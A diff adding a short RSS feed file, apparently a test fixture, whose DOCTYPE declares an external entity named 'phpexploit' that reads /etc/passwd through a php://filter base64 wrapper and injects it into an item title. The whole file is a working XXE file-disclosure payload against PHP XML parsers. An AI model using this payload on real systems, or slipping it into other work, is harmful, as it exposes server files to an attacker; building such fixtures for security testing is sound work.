@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+        <!ENTITY phpexploit SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+]>
+<rss version="2.0">
+        <channel>
+                <title><![CDATA[TITLE]]></title>
+                <description><![CDATA[DESCRIPTION]]></description>
+                <item>
+                        <title>&phpexploit;</title>
+                </item>
+        </channel>
+</rss>
